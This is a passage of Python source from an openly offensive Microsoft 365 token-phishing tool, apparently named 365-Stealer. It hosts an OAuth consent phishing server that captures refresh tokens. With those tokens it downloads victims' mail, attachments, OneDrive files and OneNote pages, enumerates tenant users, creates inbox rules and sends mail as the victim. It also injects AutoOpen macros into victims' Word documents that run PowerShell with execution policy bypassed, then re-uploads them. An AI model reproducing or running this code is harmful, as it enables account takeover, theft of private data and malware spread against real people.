        response = requests.get("https://graph.microsoft.com/v1.0/me/drive", headers={"Authorization": token})

        if response.status_code != 200:
            # If the victim doesn't have a license and 'refresh_all' is not set,
            # print a warning message and exit the program
            if not self.args.refresh_all:
                print(crayons.yellow("[!] Looks like Victim " + victimEmail + " doesn't have office365 License!", bold=True))
                sys.exit()

        # If the request was successful or 'refresh_all' is set, print a success message
        print(crayons.green("[+] Victim " + victimEmail + " have office365 License!", bold=True))
    
    def create_rules(self, rules, token, delay):
        """
        Creates rules in the Outlook inbox using the Microsoft Graph API.

        Args:
            rules (str): The JSON string containing the rules to be created.
            token (str): The access token for Microsoft Graph API.
            delay (int): The delay in seconds between API requests.
        """
        time.sleep(delay)
        # Get the existing rules
        response = requests.get("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules", headers={"Authorization": token}).json()
        value = 0
        while value >= 0:
            try:
                name = response['value'][value]['displayName']
                if name == json.loads(rules)['displayName']:
                    ruleId = response['value'][value]['id']
                    time.sleep(delay)
                    # Delete the rule if it already exists
                    delete = requests.delete("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules/" + ruleId, headers={"Authorization": token})
            except:
                break  
            value = value + 1
            
        time.sleep(delay)   
        # Create the new rules 
        response = requests.post("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules", headers={"Authorization": token, "Content-Type": "application/json"}, data=rules)
        if response.status_code == 201:
            if self.args.refresh_all is False:
                print(crayons.green('[+] Outlook rules created', bold=True))
        else:
            if self.args.refresh_all is False:
                print(crayons.red('[-] Rules not created', bold=True))
                print(crayons.red('Error: ' + response.json()['error']['message'], bold=True))
    
    def onedrive(self, token, delay, folder, extensions, macros, victimEmail):
        """
        Downloads files from OneDrive and injects macros into .docx files.

        :param token: The access token.
        :param delay: The delay between requests.
        :param folder: The folder to save the files to.
        :param extensions: The file extensions to download.
        :param macros: The macros or PowerShell script file to inject.
        :param victimEmail: The email address of the victim.
        """
        try: 
            # Wait for the specified delay
            time.sleep(delay)
            # Get the list of files in the OneDrive root folder
            response = requests.get("https://graph.microsoft.com/v1.0/me/drive/root/children", headers={"Authorization": token})
            
            # Check if the access token has access for OneDrive
            if response.status_code == 401:
                if self.args.refresh_all is False:
                    print(crayons.red("[-] Access token doesn't have access for OneDrive", bold=True))
                    return
            time.sleep(delay)

            # Parse the response as JSON
            response = requests.get("https://graph.microsoft.com/v1.0/me/drive/root/children", headers={"Authorization": token}).json()
            try:
                # Check if the OneDrive is empty or the access token has no rights on it
                response['value'][0]['id']
            except:
                if self.args.refresh_all is False:
                    print(crayons.yellow('[!] OneDrive is Empty or Access Token has no rights on it!', bold=True))
                return
            
            print(crayons.blue(f'[*] Creating folder: {folder}/onedrive', bold=True))
            try:
                os.mkdir(folder + '/onedrive')
                print(crayons.green(f'[+] Folder created: {folder}/onedrive\n', bold=True))
            except FileExistsError:
                print(crayons.blue(f'[*] Folder already exists.\n', bold=True))

            value = 0
            downloaded_files = []
            while value >= 0:
                try:
                    # Get the download URL and file details
                    url = response['value'][value]['@microsoft.graph.downloadUrl']
                    name = response['value'][value]['name']
                    itemId = response['value'][value]['id']
                    filename, extension = os.path.splitext(name)
                    extension = extension.replace(".", '')
                    filePath = folder + '/onedrive/' + name
                    # Create the folder to save the files to
                    
                    # Download the file if it matches the specified extensions or '*'
                    if extension in extensions or extensions == '*':
                        if self.args.refresh_all is False:
                            print(crayons.blue('[*] Retrieving OneDrive Files', bold=True))

                        time.sleep(delay)
                        r = requests.get(url, allow_redirects=True)
                        open(filePath, 'wb').write(r.content)
                        self.insert_BLOB(itemId, victimEmail, filePath, name)

                        downloaded_files.append(name)  # Store the file name

                        if self.args.refresh_all is False:
                            print(crayons.green(name + ' Downloaded!\n', bold=True))

                    value = value + 1
                
                except Exception as e:
                    # If there are no more files, break the loop
                    if "list index out of range" in str(e):
                        print(crayons.magenta('[>] All files downloaded from OneDrive', bold=True))
                        break
                    else:
                        print(crayons.red(f"[-] Error: {str(e)}", bold=True))
                        break
            # Display the downloaded files and ask if macro injection should start
            if self.args.injection:
                if downloaded_files:
                    print(crayons.white('\nThe following files were downloaded:', bold=True))
                    for i, file_name in enumerate(downloaded_files, start=1):
                        print(crayons.white(f"{i}. {file_name}", bold=True))

                    inject_macros = input(crayons.cyan('[?] Do you want to start the macro injection process? Default is "no" [y/n]: ', bold=True))
                    
                    if inject_macros == 'y' or inject_macros == 'yes':
                        macro_files = [file for file in downloaded_files if file.endswith(('.doc', '.docx'))]
                        if not macro_files:
                            print(crayons.red("[-] No files available for macro injection.", bold=True))
                            return
                        
                        print(crayons.white('\nThe following files are eligible for macro injection:', bold=True))
                        for i, file_name in enumerate(macro_files, start=1):
                            print(crayons.white(f"{i}. {file_name}", bold=True))

                        while True:
                            choice = input(crayons.cyan('[?] Enter the number of the file you want to inject macros into (or type "exit" to cancel): ', bold=True))

                            if choice.lower() == 'exit':
                                print(crayons.red('[-] Macro injection process canceled.', bold=True))
                                return

                            if choice.isdigit() and 1 <= int(choice) <= len(macro_files):
                                selected_file = macro_files[int(choice) - 1]
                                docxfile = folder + '/onedrive/' + selected_file
                                if os.path.isfile(macros):
                                    if macros.endswith('.ps1'):
                                        print(crayons.blue(f'\n[*] Creating .vbs script from the PowerShell script: {macros}', bold=True))
                                        vbs_script = O365Stealer._get_macro_code(macros)
                                        with open ("..\\macro_script.vbs", "w") as f:
                                            f.write(vbs_script)
                                        self.macro_file_path = os.path.abspath("..\\macro_script.vbs")
                                        print(crayons.blue(f'[*] Injecting macros into {selected_file}', bold=True))
                                        self.create_macros(docxfile, itemId, name, token, delay, self.macro_file_path)
                                    elif macros.endswith('.vbs'):
                                        print(crayons.blue(f'[*] Injecting macros into {selected_file}', bold=True))
                                        self.create_macros(docxfile, itemId, selected_file, token, delay, macros)
                                else: 
                                    if self.args.refresh_all is False:
                                        print(crayons.red("[-] Error: Macros file not found, try to provide the correct path using --set-config", bold=True))
                                break
                            else:
                                print(crayons.red("[-] Invalid choice. Please enter a valid number.", bold=True))
            else:
                print(crayons.yellow("[!] Macro injection is disabled (to enable injection, use the --injection option)", bold=True))

            # Print a completion message if not in refresh all mode
            if self.args.refresh_all is False:
                print(crayons.green('[+] Onedrive Done', bold=True))
                return
        except KeyboardInterrupt:
            print(crayons.red("\nKeyboardInterrupt: Exiting...", bold=True))

    def onenote(self, token, Delay, folder):
        """
        This function retrieves and downloads OneNote pages from the victim's OneDrive.

        Args:
            token (str): The access token.
            Delay (int): The delay between requests.
            folder (str): The folder path to save the downloaded files.
        """
        time.sleep(Delay)

        # Send a GET request to retrieve OneNote pages
        response = requests.get("https://graph.microsoft.com/v1.0/me/onenote/pages/", headers={"Authorization": token})
        if response.status_code == 401:
            if self.args.refresh_all is False:
                print(crayons.red("[-] Access token doesn't have access for OneNote", bold=True))
                return
        time.sleep(Delay)

        # Check if the access token has the required permissions
        response = requests.get("https://graph.microsoft.com/v1.0/me/onenote/pages/", headers={"Authorization": token}).json()
        try:
            # Check if there are any OneNote pages
            response['value'][0]['contentUrl']
        except:
            if self.args.refresh_all is False:
                print(crayons.yellow('[!] OneNote is Empty or accessToken has no rights on it!', bold=True))
            return

        value = 0
        while value >= 0:
            try:
                if self.args.refresh_all is False:
                    print(crayons.magenta("[!] Downloading OneNote files!", bold=True))
                time.sleep(Delay)

                # Retrieve the content URL of the OneNote page
                url = response['value'][value]['contentUrl']

                # Send a GET request to retrieve the page content
                data = requests.get(url, headers={"Authorization": token})
                data = data.text
                # Extract the title of the page
                title = response['value'][value]['title']

                # Create the file name with the extension '.html'
                name = title + '.html'
                try:
                    # Create the 'onenote' directory if it doesn't exist
                    os.mkdir(folder + '/onenote')
                except:
                    pass
                # Write the page content to a file
                with open(folder + '/onenote/' + name, "w") as f:
                    f.write(data)
                if self.args.refresh_all is False:
                    print(crayons.magenta(name + " Downloaded!\r\n", bold=True))
            except Exception as e:
                break

            value = value + 1
        if self.args.refresh_all is False:
            print(crayons.magenta('[+] OneNote Done', bold=True))
    
    def attachments(self, Id, HasAttachments, token, folder, victimEmail):
        """
        Retrieves attachments from a message in the inbox folder of a user's mailbox.

        Args:
            Id (str): The ID of the message.
            HasAttachments (bool): Indicates whether the message has attachments.
            token (str): The access token.
            folder (str): The folder where the attachments will be saved.
            victimEmail (str): The email address of the victim.
        """
        if HasAttachments:
            # Wait for the specified delay before making the request
            time.sleep(self.Delay)
            # Get the attachments for the message
            response = requests.get("https://graph.microsoft.com/v1.0/me/mailfolders/inbox/messages/" + Id + "/attachments", headers={"Authorization": token}).json()
            value1 = 0
            if self.args.refresh_all is False:
                print(crayons.cyan('\n[!] Retrieving Attachments', bold=True))
            while value1 >= 0:
                try:
                    Attachment_name = response['value'][value1]['name']
                    attachmentPath = folder + '/Attachments/' + Attachment_name
                    head, tail = os.path.split(attachmentPath)

                    # Rename the file if it's an index.php file
                    if tail.lower() == "index.php":
                        Attachment_name = Attachment_name + ".txt"

                    # Print a message if not in refresh_all mode
                    if self.args.refresh_all is False:
                        print(crayons.cyan(Attachment_name + " Downloaded!", bold=True))
                        
                    # Get the file extension
                    self.extension = (pathlib.Path(Attachment_name).suffix)

                    # Decode the attachment content
                    Content = base64.b64decode(response['value'][value1]['contentBytes'])

                    # Create the Attachments folder if it doesn't exist
                    try:
                        os.mkdir(folder + '/Attachments')
                    except:
                        pass

                    # Write the attachment to the file
                    with open(folder + '/Attachments/' + Attachment_name, "wb") as f:
                        f.write(Content)

                    # Insert the attachment into the database
                    self.insert_attachmnent(Id, victimEmail, attachmentPath, tail)
                except:
                    break
                value1 += 1
    
    def outlook(self, token, folder, victimEmail):
        """
        Fetches all the emails from the inbox and saves the details in an HTML file.
        Also saves attachments if present.
        
        :param token: Authorization token for Microsoft Graph API.
        :param folder: Folder path to save the data.
        :param victimEmail: Email address of the victim.
        """
        # Fetch emails from inbox
        response = requests.get("https://graph.microsoft.com/v1.0/me/mailfolders/inbox/messages?$top=999", headers={"Authorization": token}).json()
        # Iterate over each email
        value = 0
        # Create the output folder if it doesn't exist
        try:
            os.mkdir(folder + '/outlook')
            print(crayons.green("[+] Outlook folder created successfully!", bold=True))
        except FileExistsError:
            print(crayons.yellow("[!] Outlook folder already exists!", bold=True))
        while value >= 0:
            try:
                # Extract relevant details from the email
                Body = response['value'][value]['body']['content']
                From = response['value'][value]['from']['emailAddress']['address']
                ToRecipients = response['value'][value]['toRecipients']
                CcRecipients_og = response['value'][value]['ccRecipients']
                CcRecipients = 'CcRecipients: ' + str(CcRecipients_og) + '\n' + '<br>'
                BccRecipients_og = response['value'][value]['bccRecipients']
                BccRecipients = 'BccRecipients: ' + str(BccRecipients_og) + '\n' + '<br>'
                ReplyTo_og = response['value'][value]['replyTo']
                ReplyTo = 'ReplyTo: ' + str(ReplyTo_og) + '\n' + '<br>'
                sentDateTime = response['value'][value]['sentDateTime']
                Subject = response['value'][value]['subject']
                Flag = response['value'][value]['flag']['flagStatus']
                HasAttachments = response['value'][value]['hasAttachments']
                Id = response['value'][value]['id']

                # Format the recipient lists
                if CcRecipients == []:
                    CcRecipients = ''
                if BccRecipients == '':
                    BccRecipients = ''
                newRecipients = O365Stealer._format_recipients(ToRecipients)
                ToRecipients = newRecipients[2:]

                # Create the HTML result string
                result = O365Stealer._create_html_result(value1=value + 1, Subject=Subject, From=From, ToRecipients=ToRecipients, CcRecipients=CcRecipients, BccRecipients=BccRecipients, ReplyTo=ReplyTo, Flag=Flag, HasAttachments=HasAttachments, sentDateTime=sentDateTime, Body=Body)

                # Save attachments if present
                self.attachments(Id, HasAttachments, token, folder, victimEmail)

                # Save the email details in the database
                sqldata = (Id, victimEmail, str(Body), From, str(ToRecipients), str(CcRecipients_og), str(BccRecipients_og), str(ReplyTo_og), Subject, Flag, HasAttachments, str(sentDateTime))
                self.insert_outlook(sqldata)
                    
                # Save the HTML result in a file
                with open(folder + '/outlook/all_mails.html', "a", encoding="utf-8") as f:
                    f.write(result)
                    print(crayons.green("[+] Email saved successfully!", bold=True))
            except Exception as e:
                try:
                    if self.args.refresh_all is False:
                        print(crayons.red("[-] Outlook Error: " + response['error']['message'], bold=True))
                except:
                    pass
                break

            value += 1
        print(crayons.green("[+] Outlook Done", bold=True))
    
    def create_macros(self, docxfile, itemId, name, token, delay, macros):
        """
        Injects macros into a Word document and uploads it to OneDrive.

        Args:
            docxfile (str): The path to the input Word document.
            itemid (str): The ID of the OneDrive item.
            name (str): The name of the document.
            token (str): The access token for OneDrive API.
            delay (int): The delay between requests.
            macros (str): The path to the macros file.
        """

        # Create VBS script to open Word document, inject macros and save as .doc
        vbs = '''
            Dim wdApp
            Set wdApp = CreateObject("Word.Application")
            wdApp.Documents.Open("[docxfile]")
            wdApp.Documents(1).VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "[macros]"
            wdApp.Documents(1).SaveAs2 "[output]", 0
            wdApp.Quit
        '''
        output = docxfile.replace(".docx", ".doc")
        vbs = vbs.replace("[docxfile]", docxfile)
        vbs = vbs.replace("[macros]", macros)
        vbs = vbs.replace("[output]", output)
        vbs = '\n'.join(line.lstrip() for line in vbs.splitlines())

        # Write VBS script to file
        f = open("..\\temp.vbs", "w")
        f.write(vbs)
        f.close()

        # Execute VBS script
        os.system("cscript ..\\temp.vbs")
        # Read injected .doc content
        path = (docxfile).replace("\\", "/")
        try:
            f = open(path, "r", errors='ignore')
            content = f.read()
        except Exception as e:
            print(crayons.red("[-] Error creating macros:" + str(e), bold=True))

        # Rename .docx file to .doc
        name = name.replace(".docx", ".doc")
        data = '{ "name": "[name]" }'
        data = data.replace("[name]", name)
        time.sleep(delay)

        response = requests.patch("https://graph.microsoft.com/v1.0/me/drive/items/" + itemId, headers={"Authorization": token, "Content-Type": "application/json"}, data=data)

        if response.status_code == 200:
            if self.args.refresh_all is False:
                print(crayons.green("[+] File renamed to .doc!", bold=True))
        else:
            if self.args.refresh_all is False:
                print(crayons.red("[-] File not renamed!", bold=True))

        # Upload injected .doc content to OneDrive
        with open(path, 'rb') as content:
            time.sleep(delay)
            response = requests.put("https://graph.microsoft.com/v1.0/me/drive/items/" + itemId + "/content", headers={"Authorization": token, "Content-Type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document"}, data=content)

        if response.status_code == 200:
            if self.args.refresh_all is False:
                print(crayons.green("[+] Macros successfully injected!", bold=True))
        else:
            if self.args.refresh_all is False:
                print(crayons.red("[-] Macros not injected", bold=True))
  
    @staticmethod
    def _get_macro_code(macros):
        with open(macros, "r") as f:
            script = f.read()

        # Escape double quotes for the VBA string
        script = script.replace('"', '""')

        # Ensure newlines are preserved in the VBA string
        script_lines = script.splitlines()
        script_vba = ' & vbCrLf & _\n'.join([f'"{line}"' for line in script_lines])

        if "powershell" in script.lower():
            # If the script already contains 'powershell', treat it as a complete command
            macro_code = f'''
Sub AutoOpen()
    Dim shell As Object
    Dim tempScriptPath As String
    tempScriptPath = Environ("TEMP") & "\\tempScript.ps1"

    ' PowerShell script provided by the user
    Dim psScript As String
    psScript = {script_vba}

    ' Write the PowerShell script to a temporary file
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim tempScriptFile As Object
    Set tempScriptFile = fso.CreateTextFile(tempScriptPath, True)
    tempScriptFile.WriteLine psScript
    tempScriptFile.Close

    ' Run the PowerShell script
    Set shell = CreateObject("WScript.Shell")
    shell.Run  psScript, 0
End Sub
'''
            return macro_code
        else:
            # Wrap it in a PowerShell command if not already done
            macro_code = f'''
Sub AutoOpen()
    Dim shell As Object
    Dim tempScriptPath As String
    tempScriptPath = Environ("TEMP") & "\\tempScript.ps1"

    ' PowerShell script provided by the user
    Dim psScript As String
    psScript = {script_vba}

    ' Write the PowerShell script to a temporary file
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim tempScriptFile As Object
    Set tempScriptFile = fso.CreateTextFile(tempScriptPath, True)
    tempScriptFile.WriteLine psScript
    tempScriptFile.Close

    ' Run the PowerShell script
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -ExecutionPolicy Bypass -File """ & tempScriptPath & """", 0
End Sub
'''
            return macro_code

    @staticmethod
    def _format_recipients(recipients):
        """
        Formats the recipient lists by combining email addresses.
        """
        emailAddresscount = 0
        newRecipients = ""
        while True:
            try:
                Recipients = recipients[emailAddresscount]['emailAddress']['address']
                emailAddresscount += 1
                newRecipients = newRecipients + ", " + Recipients
            except:
                break
        return newRecipients

    @staticmethod
    def _create_html_result(value1, Subject, From, ToRecipients, CcRecipients, BccRecipients, ReplyTo, Flag, HasAttachments, sentDateTime, Body):
        """
        Creates the HTML result string for the email.
        """
        result = (
            '<div style="width:80%; padding:10px; margin: 0 auto; background-color:#ffd5d5">' +
            str(value1) + '.' +
            '<b>Subject:' + str(Subject) + '</b>' +
            '<b>From:&emsp;</b> ' + str(From) + '\n' + '<br>' +
            '&emsp;&emsp; ToRecipients: ' + str(ToRecipients) + '\n' + '<br>' +
            '&emsp;&emsp; ' + CcRecipients +
            '&emsp;&emsp; ' + BccRecipients +
            '&emsp;&emsp; ' + ReplyTo +
            '&emsp;&emsp; Flag: ' + str(Flag) + '\n' + '<br>' +
            '&emsp;&emsp; HasAttachments: ' + str(HasAttachments) + '\n' + '<br>' +
            '</div>' +
            '<div style="width:80%; padding:10px; margin: 0 auto; background-color:#e2fad7">' + '<br>' +
            str(Body) + '\r\n\r\n' + '<br>' +
            '</div>' +
            '<hr width=100%  align=left>'
        )
        return result

    def list_user(self, token):
        """
        List all users in the tenant.

        Args:
            token (str): The access token.
        """
        # Send a GET request to the Graph API to retrieve all users
        response = requests.get(
            "https://graph.microsoft.com/v1.0/users?$top=999",
            headers={"Authorization": token}
        )

        # If the request is forbidden, print a message and return
        if response.status_code == 403:
            if self.args.refresh_all is False:
                print(crayons.yellow("[!] Victim's token doesn't have permission to list users!", bold=True))
            return
        
        # Parse the response as JSON
        response = response.json()

        # Loop through all users and insert their data into the database
        value = 0
        while True:
            try:
                # Extract user data
                displayName = response['value'][value]['displayName']
                givenName = response['value'][value]['givenName']
                jobTitle = response['value'][value]['jobTitle']
                mail = response['value'][value]['mail']
                mobilePhone = response['value'][value]['mobilePhone']
                officeLocation = response['value'][value]['officeLocation']
                preferredLanguage = response['value'][value]['preferredLanguage']
                surname = response['value'][value]['surname']
                userPrincipalName = response['value'][value]['userPrincipalName']
                Id = response['value'][value]['id']
                
                # Create a tuple with the user data
                data = (displayName, givenName, jobTitle, mail, mobilePhone, officeLocation, preferredLanguage, surname, userPrincipalName, Id)
                
                # Insert the user data into the database
                self.insert_userlist(data)

                # Move to the next user
                value += 1
            except Exception as e:
                # If an exception occurs, break the loop
                break

        # If all users are being refreshed, print a success message            
        if self.args.refresh_all is False:
            print(crayons.green("[+] All users in tenant saved!", bold=True))

    def sendmail(self, mail, fromuser, token):
        """
        Sends an email using the Microsoft Graph API.

        Args:
            mail (str): JSON string containing the email message.
            fromuser (str): The email address of the sender.
            token (str): The access token for the Microsoft Graph API.
        """
        try:
            # Parse the email message JSON
            to = json.loads(mail)
            to = to['message']['toRecipients'][0]['emailAddress']['address']
        except Exception as e:
            # Print an error message if the JSON body is invalid
            print(crayons.red("[-] Error in json body: " + str(e)))
            return

        url = "https://graph.microsoft.com/v1.0/me/sendMail/"
        header = {"Authorization": token, "Content-type": "application/json"}

        # Send the email using the Microsoft Graph API
        response = requests.post(url, headers=header, data=mail)
        status = response.status_code

        if status == 202:
            # Print a success message if the email was sent successfully
            msg = '[+] Mail sent from user ' + fromuser + " to " + str(to)
            if self.args.refresh_all is False:
                print(crayons.green(msg, bold=True))
        else:
            # Print an error message if the email was not sent successfully
            msg = '[-] Mail not sent!'
            if self.args.refresh_all is False:
                print(crayons.red(msg, bold=True))
                print(crayons.red("Error: " + response.json()['error']['message'], bold=True))


def worker_function(refresh_token, client_id, client_secret, args):
    # Create an instance of O365Stealer class
    stealer_instance = O365Stealer(refresh_token, client_id, client_secret, args)

    # Call the main function of the O365Stealer class
    stealer_instance.main()

def main():
    """
    Main function that parses command line arguments, sets up the database,
    and starts the appropriate processes.
    """
    global regex_url
    arg_parser = ArgumentParser()
    args = arg_parser.parse()
    Banner().print_banner()

    # Set up the database
    global database
    database = os.path.dirname(os.path.abspath(sys.argv[0])) + "/database.db"
    if args.database_path is not None:
        database = args.database_path

    databasepath = pathlib.Path(database)
    if databasepath.exists() is False:
        print(crayons.yellow("[!] Database path " + database + " not exist, Creating a new one!", bold=True))
    
    conn = DatabaseConnection(database)
    database_connection = conn.db_connection()
    conn.create_tables(database_connection)
    db_operation = DatabaseOperations(database_connection)

    # Set up the configuration
    if args.set_config:
        config_setup = InputHandler()
        config = config_setup.run()
        config_values = (
            config['client_id'],
            config['client_secret'],
            config['redirect_url'],
            config['redirect_after_stealing'],
            config['macros_file_path'],
            config['extension_onedrive'],
            config['delay']
        )
        db_operation.set_config(config_values)
    
    if args.get_config:
        if args.delay is not False and args.delay is not None:
            Delay = int(args.delay)
            configs = db_operation.display_config(Delay)
        configs = db_operation.display_config()

    if args.app_registration:
        input_handler = InputHandler()
        print(crayons.green("Welcome to 365-Stealer Azure App Registration.\n", bold=True))
        try:
            tenant_id = input_handler.get_input("Enter your tenant ID: ")
            app_name = input_handler.get_input("Enter the new app registration name: ")
            redirect_uri = input_handler.get_input("Enter the redirect URI: ", regex_url)
        except KeyboardInterrupt:
            print(crayons.red("\nKeyboardInterrupt occurred. Exiting..."))
            sys.exit(1)

        azure_app = AzureAppRegistration(tenant_id, app_name, redirect_uri)

        try:
            print(crayons.green("\nSelect permission method:"))
            print(crayons.green("1. Low Impact (User.ReadBasic.All)"))
            print(crayons.green("2. Use default API permissions (Required by 365-Stealer)"))
            print(crayons.green("3. Custom API permissions"))

            permission_choice = input("Enter the number of your choice (1, 2 or 3): ")
        except KeyboardInterrupt:
            print(crayons.red("\nKeyboardInterrupt occurred. Exiting..."))
            sys.exit(1)

        if permission_choice == '1':
            resource_access = [
            {"id": "b340eb25-3456-403f-be2f-af7a0d370277", "type": "Scope"},
            {"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"}] # User.Read and User.ReadBasic.All
        elif permission_choice == '2':
            azure_app.get_default_permissions()
            resource_access = None
        elif permission_choice == '3':
            resource_access = azure_app.display_permissions_and_select()
        else:
            print(crayons.red("Invalid choice. Exiting."))
            sys.exit()

        try:
            print(crayons.green("\nSelect authentication method:"))
            print(crayons.green("1. ROPC flow (requires Username and Password)."))
            print(crayons.green("2. OAuth with Client Secret (requires Client ID and Client Secret)."))
            print(crayons.green("3. Device Code Flow."))
            choice = input("Enter the number of your choice (1, 2 or 3): ")
        except KeyboardInterrupt:
            print(crayons.red("\nKeyboardInterrupt occurred. Exiting..."))
            sys.exit(1)

        try:
            if choice == '2':
                print(crayons.yellow("\n[*] Note: The App needs 'Application.ReadWrite.All' API permission (Application) with admin consent.\n"))
                client_id = input("Enter your client ID: ")
                client_secret = input("Enter your client secret: ")
                client_id, secret = azure_app.create_app_with_secret('client_secret', resource_access=resource_access, client_id=client_id, client_secret=client_secret)
            elif choice == '3':
                client_id, secret = azure_app.create_app_with_secret('device_code', resource_access=resource_access)
            elif choice == '1':
                print(crayons.yellow("\n[*] Note: User is required to have 'Application Administrator' RBAC role in Azure AD.\n"))
                username = input("Enter your username: ")
                password = input("Enter your password: ")
                client_id, secret = azure_app.create_app_with_secret('ROPC_flow', resource_access=resource_access, username=username, password=password)
            else:
                print(crayons.red("Invalid choice. Exiting."))
                sys.exit(1)

            print(crayons.green(f"New app registration created with Application (client) ID: {client_id}\n", bold=True))
            choice = input("Do you want to save the client ID and client secret to database? (y/n): ")
            print()
            if choice.lower() == 'y':
                config_setup = InputHandler(client_id, secret, redirect_uri)
                config = config_setup.run()
                config_values = (
                config['client_id'],
                config['client_secret'],
                config['redirect_url'],
                config['redirect_after_stealing'],
                config['macros_file_path'],
                config['extension_onedrive'],
                config['delay']
            )
                db_operation.set_config(config_values)
            else:
                print(crayons.yellow("ClientID and ClientSecret not saved to database.", bold=True))
                print(crayons.cyan(f"Application (client) ID: {client_id}"))
                print(crayons.cyan(f"Client Secret: {secret}"))
                sys.exit()
        except KeyboardInterrupt:
            print(crayons.red("\nKeyboardInterrupt occurred. Exiting..."))
            sys.exit()
        except Exception as e:
            print(crayons.red("Error: " + str(e)))
            sys.exit(1)
        

    configs = db_operation.get_config()
    CLIENTID              = configs[0]
    CLIENTSECRET          = configs[1]
    REDIRECTURL           = configs[2]
    RedirectAfterStealing = configs[3]
    extensions            = configs[5]
    Delay                 = configs[6]

    # Set default value for Delay if it is empty
    if Delay == "":
        Delay = 0

    if args.delay:
        Delay = args.delay

    if Delay > 0:
        print(crayons.blue('[!] Stealing processes delayed with ' + str(Delay) + ' seconds.', bold=True))

    # Parse the extensions argument
    if extensions != '*':
        extensions = extensions.strip()
        extensions = extensions.split(",")

    # Set default value for RedirectAfterStealing if it is not a valid URL
    if re.match(regex_url, RedirectAfterStealing) is  None or RedirectAfterStealing == '':
        RedirectAfterStealing = "/"

    # Start the appropriate processes based on the command line arguments
    if args.custom_steal is not None:
        print(crayons.magenta("[>] Swithed to custom stealing. " + str(args.custom_steal), bold=True)) 


    # Check if the refresh_all argument is provided
    if args.refresh_all:
        processes = []

        # Create a ThreadPoolExecutor to manage concurrent execution
        with ThreadPoolExecutor(max_workers=5) as executor:
            # Retrieve all user data from the database
            rows = db_operation.refresh_all_tokens()
            if not rows:
                print(crayons.red("[-] Users not found in database!", bold=True))
                sys.exit()

            # Submit tasks to the executor for each user
            for row in rows:
                refresh_token = row[1]
                client_id = row[2]
                client_secret = row[3]
                processes.append(executor.submit(worker_function, refresh_token, client_id, client_secret, args))

            # Collect and handle the results of the tasks
            for task in as_completed(processes):
                try:
                    task.result()
                except Exception as e:
                    print(crayons.red(f"An error occurred: {str(e)}", bold=True))

    # Check if the refresh_user argument is provided and is not None
    elif args.refresh_user is not None:
        # Retrieve user data for the specified user from the database
        rows = db_operation.refresh_user_tokens(args.refresh_user)
        if not rows:
            print(crayons.red("[-] User not found in database!", bold=True))
            sys.exit()
            
        # Iterate over the retrieved user data and extract refresh token, client ID, and client secret
        for row in rows:
            refresh_token = row[1]
            client_id = row[2]
            client_secret = row[3]

            # Create an instance of O365Stealer with the extracted data and args
            stealer_instance = O365Stealer(refresh_token, client_id, client_secret, args)
            # Call the main method of the O365Stealer instance to perform the stealing operation
            stealer_instance.main()

    # Check if the run_app argument is provided and is not False
    elif args.run_app is not False:
        # Initialize a Flask application
        APP = flask.Flask(__name__)
        APP.debug = True
        APP.secret_key = "development"
        SCOPES = "https://graph.microsoft.com/.default openid offline_access "
        AUTHORITY_URL = "https://login.microsoftonline.com/common"
        
        try:
            # Setup SSL context for secure connections
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            cert = os.path.dirname(os.path.abspath(sys.argv[0])) + "/server.cert"
            key = os.path.dirname(os.path.abspath(sys.argv[0])) + "/server.key"
            context.load_cert_chain(cert, key)
        except Exception as e:
            # Handle SSL certificate loading errors
            print(crayons.yellow("[!] SSL CERT Error: " + str(e), bold=True))
            print(crayons.yellow("[!] Check if server.cert and server.key exist"))
            context = 'adhoc'  # Use adhoc SSL context if certificate loading fails
        
        # Check if logging is disabled
        if args.disable_logs:
            APP.logger.disabled = True
            log = logging.getLogger('werkzeug')
            log.disabled = True
            print(crayons.blue("Logs are disabled!", bold=True))
        
        # Function to create a phishing link
        def createPhishLink():
            params = urllib.parse.urlencode({
                'response_type': 'code',
                'client_id': CLIENTID,
                'scope': SCOPES,
                'redirect_uri': REDIRECTURL,
                'response_mode': 'query'
            })
            return AUTHORITY_URL + '/oauth2/authorize?' + params
        
        # Route for the home page
        @APP.route('/')
        def home():
            return flask.render_template('index.html', LOGINURL="/login")
        
        # Route for the login page
        @APP.route('/login')
        def login():
            return flask.redirect(createPhishLink())
        
        # Route for handling the authorization code after login
        @APP.route('/login/authorized', methods=['GET', 'POST'])
        def authorized():
            try:
                # Retrieve the authorization code from the request arguments
                code = flask.request.args['code']
                
                # Create a confidential client application
                app = msal.ConfidentialClientApplication(
                    CLIENTID,
                    client_credential=CLIENTSECRET,
                    authority='https://login.microsoftonline.com/common'
                )
                
                # Exchange the authorization code for a refresh token and access token
                response = app.acquire_token_by_authorization_code(
                    code,
                    scopes=['https://graph.microsoft.com/.default'],
                    redirect_uri=REDIRECTURL
                )
                
                if 'access_token' in response:
                    refresh_token = response['refresh_token']
                    
                    # Start a new thread to handle the token and perform the stealing operation
                    download_thread = threading.Thread(
                        target=worker_function, 
                        name="Downloader", 
                        args=(refresh_token, CLIENTID, CLIENTSECRET, args)
                    )
                    download_thread.start()
                    
                    return flask.redirect(RedirectAfterStealing)
                else:
                    error_message = response.get('error_description', 'Unknown error occurred')
                    print(crayons.red("Error: " + error_message, bold=True))
                    return flask.redirect("/")
            except Exception as e:
                # Handle errors during the authorization process
                print(crayons.red("Error: " + str(e), bold=True))
                return flask.redirect("/")
        
        # Main entry point for running the Flask application
        if __name__ == '__main__':
            try:
                print(crayons.yellow("Phishing Link => ", bold=True) + crayons.green(createPhishLink() + "\n", bold=True))
                # Check if SSL is disabled and run the app on HTTP
                if args.no_ssl:
                    PORT = 80
                    if args.port is not None:
                        PORT = args.port
                    print(crayons.yellow("Home page running on port: ", bold=True) + crayons.green(PORT, bold=True) + "\n")
                    APP.run(host="0.0.0.0", port=PORT, use_reloader=False)
                else:
                    # Run the app on HTTPS
                    PORT = 443
                    if args.port is not None:
                        PORT = args.port
                    print(crayons.yellow("Home page running on port: ", bold=True) + crayons.green(PORT, bold=True) + "\n")
                    APP.run(host="0.0.0.0", port=PORT, use_reloader=False, ssl_context=context)
            except Exception as e:
